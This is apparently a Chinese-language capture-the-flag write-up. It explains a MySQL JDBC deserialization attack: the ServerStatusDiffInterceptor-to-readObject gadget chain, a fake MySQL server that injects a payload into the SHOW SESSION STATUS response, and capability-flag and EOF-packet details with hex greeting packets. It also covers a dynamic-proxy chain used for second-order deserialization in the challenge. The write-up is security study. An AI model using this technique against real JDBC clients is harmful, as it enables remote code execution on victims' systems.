JDBC

JDBC如雷贯耳，可这是一个什么玩意？

JDBC(Java Database Connectivity)是Java提供对数据库进行连接、操作的标准API。Java自身并不会去实现对数据库的连接、查询、更新等操作而是通过抽象出数据库操作的API接口(JDBC)，不同的数据库提供商必须实现JDBC定义的接口从而也就实现了对数据库的一系列操作。

我用wireshake抓了这个Jdbc_client与本地mysql服务的数据包，简单分析一下（这里为什么要抓包，我们后续会说明）

按照建立连接的时间，首先是Server Greeting包，这是 MySQL 握手阶段的第一步，当你的 Java 客户端连接到 3306 端口时，服务器都会发送这个包，用于告诉客户端自己的版本，以及自己生成的随机数和Authentication Plugin（身份验证插件）

其次客户端递交账号密码；接着服务端返回Response OK 对应的包0700000200000002000000；然后就是客户端 Request Query; 再接着就是mysql服务端的Response TABULAR Response，SHOW SESSION STATUS 响应包

gadget链

com.mysql.cj.jdbc.result.ResultSetImpl#getOBject()调用了readObject()方法

我们简单看看这个getObject(),想要触发obj = objIn.readObject();要满足一些条件，首先要满足type属于二进制或者是Blob,其次autoDeserialize要为true

JDBC 通过 MySQL 数据库查询数据会返回一个结果集，将查询到的结果返回给程序，并将结果封装在 ResultSetImpl 这个类中,所以这个类不满足用户可控输入这一点

接下来是com.mysql.cj.jdbc.util.ResultSetUtil#resultSetToMap()调用了ResultSetImpl#getObject(),ResultSetUtil 这个类是用来处理一些测试实例的结果

继续往上看看，com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor#populateMapWithSessionStatusValues()调用了ResultSetUtil#resultSetToMap()

最后再往上，ServerStatusDiffInterceptor#preProcess()和ServerStatusDiffInterceptor#postProcess()都调用了ServerStatusDiffInterceptor#populateMapWithSessionStatusValues().而preProcess 和 postProcess ，是执行查询语句自动执行的方法

可是ServerStatusDiffInterceptor是一个什么类？

是一个拦截器类，拦截器允许你在 SQL 查询执行、事务处理、连接管理等操作时执行额外的操作。在 JDBC URL 中设定属性 queryInterceptors 为 ServerStatusDiffInterceptor 时，执行查询语句会调用拦截器的 preProcess 和 postProcess 方法

那么现在就清晰了，在mysql查询过程中去触发我们自定义的拦截器，然后调用preProcess()方法，进而调用populateMapWithSessionStatusValues()方法；在populateMapWithSessionStatusValues()方法内部执行了SHOW SESSION STATUS,然后调用了resultSetToMap()方法，返回结果；该方法调用了触发反序列化漏洞的getObject()函数

总结

这是整个过程中client与fake mysql serve的交互过程(蓝底是serve发送，红底是client发送)

在调试的过程中我发现

rs.getObject(2)才会真正触发readObject,这是什么原因，我们再深入看看

在执行SHOW SESSION STATUS，结果通常为两列Variable_name 和 Value

传入1表示获取Variable_name的数据，传入2代表获取Value的数据，可是接下来int columnIndexMinusOne = columnIndex - 1为了兼容底层数组的索引，一般从0开始

而往往反序列化的恶意数据在Value处，但我很好奇这个恶意数据是什么时候放入的？

前面提到JDBC内部的拦截器在Client执行一个查询语句时会进行一次拦截，先发送SHOW SESSION STATUS，而当我们的脚本中一旦检测到if "show session status" in data:,就会将恶意的硬编码payload_content拼接到mysql_data的末尾

不过细心的我们还会发现，在payload_content后面还拼接着07000005fe000022000100,问了ai，是EOF Packet(结束包).可是翻看了结果集响应包的结构图，这个响应包一般出现在”元数据”和”数据行”,但是后续数据行结束也可以添加EOF Packet(结束包)。

这时我突然意识到原作者的疑问，他原本在”元数据”和”数据行”中间也添加了EOF，这本该更符合协议格式，作者却说报错了。

经过测试最终的确不能反弹calc,遇事不决就去调试

发现这步rs.next()==0，导致无法调用getObject.

终于在com.mysql.cj.protocol.a.NativeServerSession类下发现

取决于this.clientParam的值与16777216L（这就是十六进制的 0x01000000，二进制 0000 0001 0000 0000 0000 0000 0000 0000 )

而this.clientParam的值取决于greeting_data的能力标志位(mysql.caps.server)，而能力标志位是四字节，对于我本地4a0000000a352e352e3533000a0000004c45545940744a5100fff72102000f8015000000000000000000003969267c61504f7b406a7736006d7973716c5f6e61746976655f70617373776f726400 （注意端序问题） 800f f7ff –> 1000 0000 0000 1111 1111 0111 1111 1111 第25位为0

对于作者的greeting_data 4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400能力位为 81ff f7ff —>1000 0001 1111 1111 1111 0111 1111 1111 ,第25位为1，即丢弃EOF包

构造gadget

想要触发connect(),我们可以看到checkAllInfo()中调用了connect()方法。而在gdufs.challenge.web.invocation.InfoInvocationHandler中的invoke方法调用了checkALLInfo()。

对于调用invoke方法，这里可以使用动态代理，动态代理底层调用的是InvocationHandler类，调用被代理类的任意方法都会触发它的invoke方法，所以在序列化写入的时候会自动调用invoke方法

动态代理

如果想劫持一个对象内部的方法调用，实现类似PHP的魔术方法__call的效果就要用到java.lang.reflect.Proxy

Proxy.newProxyInstance 的第一个参数是ClassLoader，我们用默认的即可；第二个参数是我们需要代理的对象集合；第三个参数是一个实现了InvocationHandler接口的对象，里面包含了具体代理的逻辑

举个例子 ExampleInvocationHandler类实现了InvocationHandler

题目总结

这是一个典型的二次反序列化的题目，通过对cookie的data值反序列化，由于源码中对反序列化的类有严格要求，所以此次反序列化作为跳板进而去触发jdbc；对于如何触发的jdbc,上文中提到的代理是关键，由于poc最后包装的是infoproxy，也就是databaseInfo类，调用这个类中的方法触发代理，进而激活jdbc反序列化
